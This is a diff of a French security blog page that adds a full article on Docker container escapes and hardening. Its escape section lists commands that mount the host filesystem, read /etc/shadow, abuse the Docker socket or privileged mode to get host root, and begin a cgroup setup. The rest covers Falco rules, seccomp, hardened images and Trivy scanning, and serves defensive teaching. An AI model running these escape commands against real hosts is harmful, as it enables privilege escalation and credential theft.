@@ -4,6 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- ===== GOOGLE ANALYTICS ===== -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CRVR89FWBH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-CRVR89FWBH');
+</script>
+
 <!-- ===== SEO ===== -->
 <title>Sécurité avancée des conteneurs : escapes et hardening — Temgus.CyberBlog</title>
 <meta name="description" content="Container escape techniques, socket Docker, capabilities, seccomp, AppArmor et Falco pour sécuriser Docker.">
@@ -12,7 +21,7 @@
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://temgus2025.github.io/temgus-cyberblog/pages/securite-conteneurs-docker-avance.html">
 
-<!-- ===== OPEN GRAPH (Facebook, LinkedIn) ===== -->
+<!-- ===== OPEN GRAPH ===== -->
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://temgus2025.github.io/temgus-cyberblog/pages/securite-conteneurs-docker-avance.html">
 <meta property="og:title" content="Sécurité avancée des conteneurs : escapes et hardening — Temgus.CyberBlog">
@@ -28,7 +37,6 @@
 
 <!-- ===== TWITTER CARD ===== -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:site" content="@temgus">
 <meta name="twitter:title" content="Sécurité avancée des conteneurs : escapes et hardening — Temgus.CyberBlog">
 <meta name="twitter:description" content="Container escape techniques, socket Docker, capabilities, seccomp, AppArmor et Falco pour sécuriser Docker.">
 <meta name="twitter:image" content="https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png">
@@ -41,22 +49,482 @@
   "headline": "Sécurité avancée des conteneurs : escapes et hardening",
   "description": "Container escape techniques, socket Docker, capabilities, seccomp, AppArmor et Falco pour sécuriser Docker.",
   "datePublished": "2025-09-08",
-  "author": {"@type": "Person", "name": "Temgus", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
-  "publisher": {"@type": "Person", "name": "Temgus"},
+  "author": {"@type": "Person", "name": "Derrick Temgoua", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
+  "publisher": {"@type": "Person", "name": "Derrick Temgoua"},
   "url": "https://temgus2025.github.io/temgus-cyberblog/pages/securite-conteneurs-docker-avance.html",
   "inLanguage": "fr",
   "keywords": "Docker, container escape, seccomp, Falco, Trivy",
-  "timeRequired": "PT11M"
+  "timeRequired": "PT11M",
+  "image": "https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png"
 }
 </script>
 
+<!-- ===== STYLES ===== -->
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/article.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+<style>
+  /* Styles spécifiques aux pages statiques */
+  .static-article-layout {
+    max-width: 860px;
+    margin: 100px auto 60px;
+    padding: 0 24px;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    color: #c9d1d9;
+    line-height: 1.8;
+  }
+  .static-article-layout h1 {
+    color: #00d4ff;
+    font-size: 2rem;
+    margin-bottom: 12px;
+  }
+  .static-article-layout h2 {
+    color: #00d4ff;
+    font-size: 1.4rem;
+    margin-top: 40px;
+    border-left: 3px solid #00d4ff;
+    padding-left: 12px;
+  }
+  .static-article-layout h3 {
+    color: #7ee787;
+    font-size: 1.1rem;
+    margin-top: 24px;
+  }
+  .static-article-layout p { margin: 12px 0; }
+  .static-article-layout ul, .static-article-layout ol {
+    padding-left: 24px;
+    margin: 12px 0;
+  }
+  .static-article-layout li { margin: 6px 0; }
+  .static-article-layout pre {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 20px 0;
+  }
+  .static-article-layout code {
+    background: #161b22;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    color: #e6edf3;
+  }
+  .static-article-layout pre code {
+    background: none;
+    padding: 0;
+  }
+  .static-article-layout strong { color: #e6edf3; }
+  .static-article-layout a { color: #00d4ff; }
+
+  .article-meta-banner {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin-bottom: 32px;
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .article-meta-banner .icon { font-size: 40px; }
+  .meta-info { flex: 1; }
+  .meta-category {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .meta-details {
+    color: #8892a4;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+  .meta-details span { margin-right: 16px; }
+
+  .article-nav-links {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid #21262d;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .article-nav-links a {
+    color: #00d4ff;
+    text-decoration: none;
+    font-size: 14px;
+    max-width: 45%;
+  }
+  .article-nav-links a:hover { text-decoration: underline; }
+
+  .toc-box {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+  }
+  .toc-box h4 {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    margin: 0 0 12px;
+  }
+  .toc-list { list-style: none; padding: 0; margin: 0; }
+  .toc-list li { margin: 6px 0; }
+  .toc-list a { color: #8892a4; font-size: 14px; text-decoration: none; }
+  .toc-list a:hover { color: #00d4ff; }
+
+  .btn-read-original {
+    display: inline-block;
+    margin-top: 32px;
+    background: transparent;
+    border: 1px solid #00d4ff;
+    color: #00d4ff;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-size: 14px;
+    transition: all 0.2s;
+  }
+  .btn-read-original:hover {
+    background: #00d4ff;
+    color: #060d1a;
+  }
+</style>
 </head>
-<body style="background:#060d1a;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:20px;text-align:center;padding:40px">
-  <div style="font-size:48px">🐳</div>
-  <h1 style="color:#00d4ff;font-size:22px;max-width:600px">Sécurité avancée des conteneurs : escapes et hardening</h1>
-  <p style="color:#8892a4;max-width:500px">Container escape techniques, socket Docker, capabilities, seccomp, AppArmor et Falco pour sécuriser Docker.</p>
-  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#securite-conteneurs-docker-avance" style="background:#00d4ff;color:#060d1a;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700">
-    Lire l'article →
+<body style="background:#060d1a">
+
+<canvas id="binary-canvas"></canvas>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <a href="../index.html" class="logo">Temgus.<span>CyberBlog</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Accueil</a></li>
+    <li><a href="../index.html#articles" class="active">Articles</a></li>
+    <li><a href="../index.html#categories">Catégories</a></li>
+    <li><a href="../a-propos.html">À propos</a></li>
+  </ul>
+  <a href="../index.html" class="btn-outline" style="font-size:13px;padding:7px 16px">← Retour</a>
+</nav>
+
+<!-- ARTICLE COMPLET -->
+<main class="static-article-layout">
+
+  <!-- Bannière méta -->
+  <div class="article-meta-banner">
+    <div class="icon">🐳</div>
+    <div class="meta-info">
+      <div class="meta-category">Sécurité réseau</div>
+      <div style="color:#e6edf3;font-size:18px;font-weight:600">Sécurité avancée des conteneurs : escapes et hardening</div>
+      <div class="meta-details">
+        <span>📅 2025-09-08</span>
+        <span>⏱ 11 min de lecture</span>
+        <span>🏷 Avancé</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Table des matières -->
+  <div class="toc-box"><h4>// SOMMAIRE</h4><ul class="toc-list"><li><a href="#container-escape-sortir-du-conteneur">Container Escape — Sortir du conteneur</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#via-les-montages-dangereux">Via les montages dangereux</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#via-les-capabilities-dangereuses">Via les capabilities dangereuses</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#d-tection-des-tentatives-d-vasion">Détection des tentatives d'évasion</a></li>
+<li><a href="#hardening-avanc-des-conteneurs">Hardening avancé des conteneurs</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#seccomp-filtrage-des-syscalls">Seccomp — Filtrage des syscalls</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#image-hardening">Image hardening</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#scanning-d-images-avec-trivy">Scanning d'images avec Trivy</a></li>
+<li><a href="#checklist-s-curit-conteneurs">Checklist sécurité conteneurs</a></li>
+<li><a href="#conclusion">Conclusion</a></li></ul></div>
+
+  <!-- Contenu de l'article -->
+  <article><h1>Sécurité avancée des conteneurs : escapes et hardening</h1>
+
+<p>Les conteneurs Docker ne sont pas des VMs — ils partagent le kernel de l'hôte. Une mauvaise configuration peut permettre à un attaquant de s'échapper du conteneur et de compromettre l'hôte entier. Ce guide couvre les techniques d'évasion et le hardening avancé.</p>
+
+<h2 id="container-escape-sortir-du-conteneur">Container Escape — Sortir du conteneur</h2>
+
+<h3 id="via-les-montages-dangereux">Via les montages dangereux</h3>
+
+<pre><code class="language-bash"># Monter le système de fichiers de l'hôte
+<p>docker run -v /:/host -it ubuntu bash</p>
+<h1>→ Accès TOTAL au système de fichiers de l'hôte !</h1>
+<p>ls /host/etc/shadow  # Fichier des mots de passe de l'hôte</p>
+<p>chroot /host bash    # Shell sur l'hôte !</p>
+
+<h1>Monter le socket Docker (container escape classique)</h1>
+<p>docker run -v /var/run/docker.sock:/var/run/docker.sock -it ubuntu bash</p>
+<h1>Depuis l'intérieur du conteneur :</h1>
+<p>apt install docker.io -y</p>
+<p>docker run -v /:/host -it ubuntu chroot /host bash</p>
+<h1>→ Root sur l'hôte via le socket Docker !</code></pre></h1>
+
+<h3 id="via-les-capabilities-dangereuses">Via les capabilities dangereuses</h3>
+
+<pre><code class="language-bash"># Conteneur avec CAP_SYS_ADMIN
+<p>docker run --cap-add SYS_ADMIN -it ubuntu bash</p>
+
+<h1>Depuis l'intérieur :</h1>
+<p>mkdir /tmp/cgroup</p>
+<p>mount -t cgroup -o rdma cgroup /tmp/cgroup</p>
+<p>mkdir /tmp/cgroup/x</p>
+<p>echo 1 &gt; /tmp/cgroup/x/notify_on_release</p>
+
+<h1>Lire la mémoire de l'hôte</h1>
+<p>cat /proc/kallsyms | grep commit_creds  # Adresses kernel</p>
+
+<h1>Conteneur privileged (le pire) :</h1>
+<p>docker run --privileged -it ubuntu bash</p>
+<h1>Accès direct aux devices → escape trivial</h1>
+<p>fdisk -l          # Voir les disques de l'hôte</p>
+<p>mount /dev/sda1 /mnt  # Monter le disque de l'hôte !</code></pre>
+
+<h3 id="d-tection-des-tentatives-d-vasion">Détection des tentatives d'évasion</h3>
+
+<pre><code class="language-yaml"># Règles Falco pour détecter les container escapes
+
+<ul><li>rule: Container Escape via Privileged Mount</li></ul>
+<p>desc: Détecte un montage de / dans un conteneur</p>
+<p>condition: &gt;</p>
+<p>container and</p>
+<p>evt.type = mount and</p>
+<p>evt.arg.dev contains "/dev/" and</p>
+<p>not proc.name in (docker, containerd)</p>
+<p>output: "Container escape tentative (container=%container.name)"</p>
+<p>priority: CRITICAL</p>
+
+<ul><li>rule: Docker Socket Access in Container</li></ul>
+<p>desc: Accès au socket Docker depuis un conteneur</p>
+<p>condition: &gt;</p>
+<p>container and</p>
+<p>fd.name = /var/run/docker.sock</p>
+<p>output: "Accès socket Docker (container=%container.name)"</p>
+<p>priority: HIGH</code></pre>
+
+<h2 id="hardening-avanc-des-conteneurs">Hardening avancé des conteneurs</h2>
+
+<h3 id="seccomp-filtrage-des-syscalls">Seccomp — Filtrage des syscalls</h3>
+
+<pre><code class="language-json">// Profil seccomp personnalisé pour une app web
+<p>// Seulement les syscalls nécessaires</p>
+<p>{</p>
+<p>"defaultAction": "SCMP_ACT_ERRNO",</p>
+<p>"syscalls": [</p>
+<p>{</p>
+<p>"names": [</p>
+<p>"read", "write", "open", "close",</p>
+<p>"stat", "fstat", "lstat", "poll",</p>
+<p>"mmap", "mprotect", "munmap",</p>
+<p>"brk", "rt_sigaction", "ioctl",</p>
+<p>"access", "pipe", "select",</p>
+<p>"sched_yield", "mremap", "socket",</p>
+<p>"connect", "accept", "sendto",</p>
+<p>"recvfrom", "bind", "listen",</p>
+<p>"getsockname", "getpeername",</p>
+<p>"fork", "execve", "exit",</p>
+<p>"wait4", "kill", "getpid",</p>
+<p>"getuid", "getgid", "getcwd"</p>
+<p>],</p>
+<p>"action": "SCMP_ACT_ALLOW"</p>
+<p>}</p>
+<p>]</p>
+<p>}</code></pre>
+
+<pre><code class="language-yaml"># Docker Compose avec seccomp
+<p>version: '3.8'</p>
+<p>services:</p>
+<p>webapp:</p>
+<p>image: mon-app:latest</p>
+<p>security_opt:</p>
+<p>- seccomp:./seccomp-profile.json</p>
+<p>- no-new-privileges:true</p>
+<p>cap_drop:</p>
+<p>- ALL</p>
+<p>cap_add:</p>
+<p>- NET_BIND_SERVICE  # Seulement si port &lt; 1024</p>
+<p>read_only: true</p>
+<p>user: "1000:1000"</p>
+<p>tmpfs:</p>
+<p>- /tmp:size=100m</code></pre>
+
+<h3 id="image-hardening">Image hardening</h3>
+
+<pre><code class="language-dockerfile"># Dockerfile sécurisé
+
+<h1>Partir d'une image minimale</h1>
+<p>FROM gcr.io/distroless/java17-debian11  # Pas de shell, pas d'outils</p>
+
+<h1>Ou construire from scratch</h1>
+<p>FROM scratch</p>
+<p>COPY --from=builder /app/server /server</p>
+
+<h1>Si on doit utiliser une image standard</h1>
+<p>FROM ubuntu:22.04</p>
+
+<h1>Ne pas utiliser root</h1>
+<p>RUN groupadd -r appgroup &amp;&amp; useradd -r -g appgroup appuser</p>
+
+<h1>Copier les fichiers avec les bonnes permissions</h1>
+<p>COPY --chown=appuser:appgroup app/ /app/</p>
+
+<h1>Passer à l'utilisateur non-root</h1>
+<p>USER appuser</p>
+
+<h1>Exposer seulement le port nécessaire</h1>
+<p>EXPOSE 8080</p>
+
+<h1>Health check</h1>
+<p>HEALTHCHECK --interval=30s --timeout=3s \</p>
+<p>CMD curl -f http://localhost:8080/health || exit 1</p>
+
+<h1>Point d'entrée minimal</h1>
+<p>ENTRYPOINT ["/app/server"]</code></pre>
+
+<h3 id="scanning-d-images-avec-trivy">Scanning d'images avec Trivy</h3>
+
+<pre><code class="language-bash"># Scanner une image pour les vulnérabilités
+<p>trivy image mon-app:latest</p>
+
+<h1>Scanner et échouer si vulnérabilités critiques</h1>
+<p>trivy image --exit-code 1 --severity CRITICAL mon-app:latest</p>
+
+<h1>Scanner dans le CI/CD (GitHub Actions)</h1>
+<h1>- name: Run Trivy vulnerability scanner</h1>
+<h1>  uses: aquasecurity/trivy-action@master</h1>
+<h1>  with:</h1>
+<h1>    image-ref: 'mon-app:latest'</h1>
+<h1>    format: 'sarif'</h1>
+<h1>    exit-code: '1'</h1>
+<h1>    severity: 'CRITICAL,HIGH'</h1>
+
+<h1>Scanner les fichiers de configuration</h1>
+<p>trivy config ./kubernetes/</p>
+<p>trivy config ./terraform/</p>
+
+<h1>Scanner un dépôt Git</h1>
+<p>trivy repo https://github.com/mon-org/mon-repo</code></pre>
+
+<h2 id="checklist-s-curit-conteneurs">Checklist sécurité conteneurs</h2>
+
+<pre><code>Images :
+<p>✅ Images minimales (distroless, scratch)</p>
+<p>✅ Scan régulier (Trivy, Snyk)</p>
+<p>✅ Pas de secrets dans les images</p>
+<p>✅ Tags versionnés (jamais :latest en prod)</p>
+<p>✅ Images signées (cosign)</p>
+
+<p>Runtime :</p>
+<p>✅ Utilisateur non-root (USER 1000)</p>
+<p>✅ Pas de conteneurs privileged</p>
+<p>✅ Capabilities minimales (cap_drop ALL)</p>
+<p>✅ no-new-privileges:true</p>
+<p>✅ Filesystem en lecture seule (read_only: true)</p>
+<p>✅ Profil seccomp restrictif</p>
+<p>✅ AppArmor ou SELinux activé</p>
+
+<p>Réseau :</p>
+<p>✅ Network policies (Kubernetes)</p>
+<p>✅ Pas de montage du socket Docker</p>
+<p>✅ Exposition minimale des ports</p>
+
+<p>Monitoring :</p>
+<p>✅ Falco pour la détection runtime</p>
+<p>✅ Logs centralisés</p>
+<p>✅ Alertes sur comportements anormaux</code></pre>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>La sécurité des conteneurs nécessite une approche en couches : images minimales et scannées, runtime avec seccomp/AppArmor/capabilities réduits, réseau isolé et monitoring Falco. Un conteneur mal configuré — surtout avec <code>--privileged</code> ou le socket Docker monté — est une porte ouverte vers l'hôte entier. La règle d'or : traitez chaque conteneur comme potentiellement hostile et limitez au maximum ce qu'il peut faire.</p>
+
+<p>---</p>
+<p><em>Catégorie : Sécurité réseau</em></p>
+</article>
+
+  <!-- Lien vers la version interactive -->
+  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#securite-conteneurs-docker-avance" class="btn-read-original">
+    💬 Voir l'article avec commentaires →
   </a>
+
+  <!-- Navigation précédent / suivant -->
+  <div class="article-nav-links">
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/securite-api-graphql.html" class="nav-prev">← Sécurité des APIs GraphQL : vulnérabilités et protections</a>
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/attaques-navigateurs.html" class="nav-next">Attaques sur les navigateurs web : exploitation et défense →</a>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-logo">Temgus.<span>CyberBlog</span></div>
+      <div class="footer-copy">© 2025 Temgus — Tous droits réservés</div>
+    </div>
+    <div class="footer-links">
+      <a href="../mentions-legales.html">Mentions légales</a>
+      <a href="../a-propos.html">Contact</a>
+      <a href="https://github.com/temgus2025" target="_blank">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+<!-- Coloration syntaxique -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  // Highlight.js
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));
+  });
+
+  // Animation binaire (depuis style.css / app.js existant)
+  const canvas = document.getElementById('binary-canvas');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 14);
+    const drops = Array(cols).fill(1);
+    function drawBinary() {
+      ctx.fillStyle = 'rgba(6,13,26,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'rgba(0,212,255,0.15)';
+      ctx.font = '12px monospace';
+      drops.forEach((y, i) => {
+        ctx.fillText(Math.random() > 0.5 ? '1' : '0', i * 14, y * 14);
+        if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      });
+    }
+    setInterval(drawBinary, 50);
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  }
+
+  // Navbar scroll
+  window.addEventListener('scroll', () => {
+    const nav = document.getElementById('navbar');
+    if (nav) nav.classList.toggle('scrolled', window.scrollY > 50);
+  });
+
+  // Smooth scroll pour le sommaire
+  document.querySelectorAll('.toc-list a').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      const target = document.querySelector(a.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
 </body>
 </html>
